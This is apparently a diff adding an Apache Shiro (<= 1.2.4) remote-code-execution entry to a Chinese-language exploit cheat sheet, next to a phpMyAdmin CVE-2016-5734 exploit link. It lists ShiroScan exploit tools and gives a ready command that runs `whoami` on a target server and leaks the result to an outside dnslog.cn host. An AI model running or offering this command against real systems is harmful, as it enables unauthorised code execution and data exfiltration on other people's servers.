@@ -2,6 +2,16 @@
 http://k8gege.org/p/ab3e87f7.html
 https://pan.baidu.com/s/1cpcQeE (需要登入百度網盤)
 
+# Apache Shiro
+https://github.com/sv3nbeast/ShiroScan
+https://github.com/fupinglee/ShiroScan (GUI圖形化，比較好用)
+http://dnslog.cn/ 
+影響範圍 :
+Apache Shiro <= 1.2.4
+use :
+利用 DNSLog 去接收是否資訊
+python shiro_rce.py http://targetip:port/login "ping `whoami`.ssngky.dnslog.cn"
+
 # phpmyadmin(CVE-2016-5734)
 https://www.exploit-db.com/exploits/40185
 影響範圍 :
